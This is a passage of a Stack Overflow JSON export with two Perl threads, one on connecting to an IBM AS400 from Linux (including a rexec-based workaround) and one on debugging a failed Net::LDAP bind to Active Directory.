"https://i.stack.imgur.com/RNuBl.jpg?s=128&g=1", "display_name": "David G", "link": "https://stackoverflow.com/users/44732/david-g"}, "reply_to_user": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "edited": false, "score": 0, "creation_date": 1494591303, "post_id": 43909456, "comment_id": 74907049, "body": "@CalleDybedahl IBM i primarily runs DB2 for i."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494598182, "post_id": 43909456, "comment_id": 74911798, "body": "Possibly relevant <a href=\"https://www-01.ibm.com/support/docview.wss?rs=71&amp;uid=swg21297335\" rel=\"nofollow noreferrer\">www-01.ibm.com/support/docview.wss?rs=71&amp;uid=swg21297335</a>"}], "answers": [{"tags": [], "owner": {"reputation": 185, "user_id": 2842468, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Sx6Oc.gif?s=128&g=1", "display_name": "ulix", "link": "https://stackoverflow.com/users/2842468/ulix"}, "is_accepted": false, "score": 0, "last_activity_date": 1495021229, "last_edit_date": 1495021229, "creation_date": 1494492844, "answer_id": 43910811, "question_id": 43909456, "link": "https://stackoverflow.com/questions/43909456/connect-as400-from-perl/43910811#43910811", "title": "Connect AS400 from PERL", "body": "<p>In the past, in absence of dedicated driver, I interfaced Perl with AS400 via standard services like rexec and ftp.</p>\n\n<pre><code># warn: this use clean user/passwd. Use with care\n$param=\"call pgm(someLib/someProc) parm('someUsefulParameters')\";\nsystem(\"rexec -a -l asUser -p asPaswd as400ipAddress \\\"${param}\\\" 2&gt;/dev/null &gt;myOutput.txt\");\n# ...then read myOutput.txt\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 3685, "user_id": 44732, "user_type": "registered", "accept_rate": 36, "profile_image": "https://i.stack.imgur.com/RNuBl.jpg?s=128&g=1", "display_name": "David G", "link": "https://stackoverflow.com/users/44732/david-g"}, "is_accepted": false, "score": 0, "last_activity_date": 1494591364, "creation_date": 1494591364, "answer_id": 43937570, "question_id": 43909456, "link": "https://stackoverflow.com/questions/43909456/connect-as400-from-perl/43937570#43937570", "title": "Connect AS400 from PERL", "body": "<p>I don't know much about Perl, but if there is a driver that can access via JDBC or ODBC, you should be able to connect fine with that.</p>\n"}], "owner": {"reputation": 408, "user_id": 7641017, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206823199097621/picture?type=large", "display_name": "Swastik Raj Ghosh", "link": "https://stackoverflow.com/users/7641017/swastik-raj-ghosh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 310, "favorite_count": 1, "answer_count": 2, "score": 0, "last_activity_date": 1495021229, "creation_date": 1494488888, "question_id": 43909456, "link": "https://stackoverflow.com/questions/43909456/connect-as400-from-perl", "title": "Connect AS400 from PERL", "body": "<p>I want to connect to AS400 using Perl. The DBI module is not supporting it. Can you suggest any other module? What other stuffs do I need? I am working on a Linux environment.</p>\n"}, {"tags": ["perl", "active-directory", "ldap", "netldap"], "comments": [{"owner": {"reputation": 9067, "user_id": 88122, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/U0pg3.png?s=128&g=1", "display_name": "jwilleke", "link": "https://stackoverflow.com/users/88122/jwilleke"}, "edited": false, "score": 0, "creation_date": 1494498907, "post_id": 43905224, "comment_id": 74859138, "body": "Your bind is failing. Try to bind using LDAP from a know to work tool. (I like Apache Studio)"}, {"owner": {"reputation": 347, "user_id": 463415, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8c325313565c843f16d04d613b15572b?s=128&d=identicon&r=PG", "display_name": "scryptKiddy", "link": "https://stackoverflow.com/users/463415/scryptkiddy"}, "reply_to_user": {"reputation": 9067, "user_id": 88122, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/U0pg3.png?s=128&g=1", "display_name": "jwilleke", "link": "https://stackoverflow.com/users/88122/jwilleke"}, "edited": false, "score": 0, "creation_date": 1494525836, "post_id": 43905224, "comment_id": 74878410, "body": "@jwilleke I&#39;m not able to add software to this Unix server, so I&#39;m using Perl Net::LDAP software since its already on the machine. I did verify the account&#39;s username / password though by logging into the domain on another Windows workstation with it.   I see that the bind failed, but I&#39;m not getting a reason from the DC so not sure what to try next."}, {"owner": {"reputation": 9067, "user_id": 88122, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/U0pg3.png?s=128&g=1", "display_name": "jwilleke", "link": "https://stackoverflow.com/users/88122/jwilleke"}, "edited": false, "score": 0, "creation_date": 1494579955, "post_id": 43905224, "comment_id": 74899629, "body": "Try: <a href=\"http://ldapwiki.com/wiki/Determining%20the%20FDN\" rel=\"nofollow noreferrer\">ldapwiki.com/wiki/Determining%20the%20FDN</a> and I suggest you use a known good LDAP Client (I use Apache Studio) which will show the LDAP Return Code. <a href=\"http://ldapwiki.com/wiki/Common%20Active%20Directory%20Bind%20Errors\" rel=\"nofollow noreferrer\">ldapwiki.com/wiki/Common%20Active%20Directory%20Bind%20Error&zwnj;&#8203;s</a>"}, {"owner": {"reputation": 347, "user_id": 463415, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8c325313565c843f16d04d613b15572b?s=128&d=identicon&r=PG", "display_name": "scryptKiddy", "link": "https://stackoverflow.com/users/463415/scryptkiddy"}, "reply_to_user": {"reputation": 9067, "user_id": 88122, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/U0pg3.png?s=128&g=1", "display_name": "jwilleke", "link": "https://stackoverflow.com/users/88122/jwilleke"}, "edited": false, "score": 0, "creation_date": 1494614866, "post_id": 43905224, "comment_id": 74921953, "body": "@jwilleke Appreciate the feedback, unfortunately I don&#39;t have rights to install Apache Studio is there another tool I can use / try that&#39;s equivalent and inherent to Windows / Linux? Also, I looked at that list, unfortunately it doesn&#39;t list information for my hex error (data 0)."}], "answers": [{"comments": [{"owner": {"reputation": 347, "user_id": 463415, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8c325313565c843f16d04d613b15572b?s=128&d=identicon&r=PG", "display_name": "scryptKiddy", "link": "https://stackoverflow.com/users/463415/scryptkiddy"}, "edited": false, "score": 0, "creation_date": 1494525517, "post_id": 43907386, "comment_id": 74878241, "body": "The output of the $mesg is dumped in the bottom part of my post which includes the result of the bind.  The bind piece is in the &#39;parent&#39; up to the Net::LDAP, while the search result is in the second half of the message concluding at the Net::LDAP::Search. That was how I got the information to post the error I received on search."}], "tags": [], "owner": {"reputation": 1979, "user_id": 2789312, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/4OgOz.png?s=128&g=1", "display_name": "palik", "link": "https://stackoverflow.com/users/2789312/palik"}, "is_accepted": false, "score": -1, "last_activity_date": 1494481365, "creation_date": 1494481365, "answer_id": 43907386, "question_id": 43905224, "link": "https://stackoverflow.com/questions/43905224/getting-000004dc-ldaperr-dsid-0c090752-when-performing-bind-in-perl-using-n/43907386#43907386", "title": "Getting &quot;000004DC: LdapErr: DSID-0C090752.&quot; when performing bind in perl using Net::LDAP", "body": "<p>With regard to the error message you posted I would say the <code>bind</code> attempt failed.\nIt might help you to improve <code>bind</code> result:</p>\n\n<pre><code>$mesg = $_ldap-&gt;bind(\"***\", password =&gt; \"***\");\n$mesg-&gt;is_error &amp;&amp; die join ';' $mesg-&gt;code, $mesg-&gt;error\n</code></pre>\n\n<p>See <a href=\"https://metacpan.org/pod/distribution/perl-ldap/lib/Net/LDAP.pod#METHODS\" rel=\"nofollow noreferrer\">Net::LDAP</a>:</p>\n\n<blockquote>\n  <p>The return value from these methods is an object derived from the\n  Net::LDAP::Message class. The methods of this class allow you to\n  examine the status of the request.</p>\n</blockquote>\n"}], "owner": {"reputation": 347, "user_id": 463415, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8c325313565c843f16d04d613b15572b?s=128&d=identicon&r=PG", "display_name": "scryptKiddy", "link": "https://stackoverflow.com/users/463415/scryptkiddy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2465, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1494481365, "creation_date": 1494467472, "question_id": 43905224, "link": "https://stackoverflow.com/questions/43905224/getting-000004dc-ldaperr-dsid-0c090752-when-performing-bind-in-perl-using-n", "title": "Getting &quot;000004DC: LdapErr: DSID-0C090752.&quot; when performing bind in perl using Net::LDAP", "body": "<p>Objective is to get the \"dn\" attribute of all the computers in my Active Directory server. </p>\n\n<p>When the code executes I get: <strong>\"000004DC: LdapErr: DSID-0C090752, comment: In order to perform this operation a successful bind must be completed on the connection.\"</strong></p>\n\n<p>Here is my code:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse Net::LDAP;\nuse Data::Dumper;\n\nmy $ldap = Net::LDAP-&gt;new( 'my.domain.com' ) or die $@;\nmy $user = 'CN=username,OU=orgname,DC=my,DC=domain,DC=com';\nmy $pass = 'my_password';\n$ldap-&gt;bind($user, password =&gt; $pass);\n#$ldap-&gt;bind;\n\nmy $mesg = $ldap-&gt;search(\n        base =&gt; \"DC=my,DC=domain,DC=com\",\n        filter =&gt; \"ObjectClass=Computers\",\n    attrs =&gt; \"dn\"\n);\n</code></pre>\n\n<p>I've tested the user / password to log into the domain directly with success. \nAdditional information if I add this to the end of the script: <code>print Dumper($mesg);</code> </p>\n\n<pre><code>$VAR1 = bless( {\n                 'parent' =&gt; bless( {\n                                      'net_ldap_version' =&gt; 3,\n                                      'net_ldap_scheme' =&gt; 'ldap',\n                                      'net_ldap_debug' =&gt; 0,\n                                      'net_ldap_socket' =&gt; bless( \\*Symbol::GEN0, 'IO::Socket::INET' ),\n                                      'net_ldap_host' =&gt; 'my.domain.com',\n                                      'net_ldap_uri' =&gt; 'my.domain.com',\n                                      'net_ldap_resp' =&gt; {},\n                                      'net_ldap_mesg' =&gt; {},\n                                      'net_ldap_async' =&gt; 0,\n                                      'net_ldap_port' =&gt; 389,\n                                      'net_ldap_refcnt' =&gt; 1\n                                    }, 'Net::LDAP' ),\n                 'errorMessage' =&gt; '000004DC: LdapErr: DSID-0C090752, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v2580',\n                 'ctrl_hash' =&gt; undef,\n                 'resultCode' =&gt; 1,\n                 'callback' =&gt; undef,\n                 'mesgid' =&gt; 2,\n                 'matchedDN' =&gt; '',\n                 'controls' =&gt; undef,\n                 'raw' =&gt; undef\n               }, 'Net::LDAP::Search' );\n</code></pre>\n\n<p>Any suggestions on how to get this script working is what I'm looking for. \nThanks!</p>\n"}]